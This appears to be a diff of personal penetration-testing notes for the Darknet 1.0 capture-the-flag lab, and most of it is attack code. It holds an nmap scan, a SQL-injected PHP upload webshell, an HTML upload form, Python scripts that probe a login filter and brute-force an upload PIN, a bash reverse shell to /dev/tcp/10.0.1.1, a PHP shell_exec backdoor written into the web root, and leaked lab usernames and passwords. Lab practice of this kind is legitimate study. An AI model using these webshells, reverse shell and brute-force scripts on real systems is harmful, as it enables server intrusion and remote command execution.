@@ -11,6 +11,10 @@ https://github.com/tennc/webshell/tree/master/php/b374k
 https://github.com/tennc/webshell/tree/master/php/wso
 
 
+
+http://blog.ottos.network/2015/06/darknet-10-write-up.html
+
+
 └─$ sudo nmap -sT -A -Pn -n -T4 -p-  192.168.110.53
 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
 Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-22 10:28 CEST
@@ -213,5 +217,108 @@ CREATE TABLE pwn.shell (code TEXT);
 INSERT INTO pwn.shell (code) VALUES ("<?php error_reporting(E_ALL); ini_set('display_errors', 1); $fp = fopen($_POST['name'], 'wb'); fwrite($fp, base64_decode($_POST['content'])); fclose($fp); ?>");
 
 
+```html
+
+<form action="http://888.darknet.com/img/upload.php" method="post">
+<input class="textbox" type="text" name="name" value="/home/devnull/public_html/img/shell.php" size="18"><br><br>
+<textarea name="content" cols=35 rows=10></textarea><br><br>
+<button  type="submit" name="action" value="Valid" />
+</form>
+
+```
+
+
+
+
+```python
+
+#!/usr/bin/python
+
+import requests
+import string
+import re
+
+def testit(c):
+    url = 'https://888.darknet.com/index.php'
+    payload = 'username=%s&password=%s&Action=Login' % (c, c)
+
+    r = requests.post(url, data=payload)
+    m = re.search('.*Ilegal.*', r.text)
+    if m:
+        print '%s\tIllegal' % c
+    else:
+        print '%s\t OK' % c
+
+for c in string.punctuation:
+    testit(c)
+
+
+```
+
+
+
+```python
+
+import itertools
+import requests
+import sys
+s = requests.session()
+target = 'http://signal8.darknet.com/xpanel/'
+
+url = '%s/index.php'%target
+payload = {
+    "username":"errorlevel",
+    "password":"tc65Igkq6DF"
+}
+r = s.post(url, data=payload)
+
+url = '%s/ploy.php'%target
+
+for perm in itertools.permutations(["37","58","22","12","72","10","59","17","99"],4):
+    payload = {
+        "Action":"Upload",
+        "checkbox[]":perm
+    }
+    files={"imag":('testing.php',"<?php phpinfo();")}
+    r = s.post(url, data=payload, files=files)
+
+    if r.text.find("Key incorrecta!") == -1:
+        print "Pin is: %s"%"".join(perm)
+        sys.exit()
+
+
+```
+
+
+$ find / -user root -writable 2>/dev/null | grep -v '/proc' | grep -v '/dev'
+
 
 /bin/bash -i > /dev/tcp/10.0.1.1/1234 0<&1 2>&1
+
+
+
+
+root@kali:~# echo "<?php error_reporting(E_ALL); ini_set('display_errors', 1); ini_set('disable_functions', 0); echo(shell_exec(\$_GET['c'])); ?>" > /var/www/html/phpbackdoor.txt
+
+
+
+
+```xml
+
+<auth>
+    <user>
+        <id>1</id>
+        <username>errorlevel</username>
+        <email>errorlevel@darknet.com</email>
+        <clave>tc65Igkq6DF</clave>
+    </user>
+    <user>
+        <id>2</id>
+        <username>devnull</username>
+        <email>devnull@darknet.com</email>
+        <clave>j4tC1P9aqmY</clave>
+    </user>
+</auth>
+
+
+```
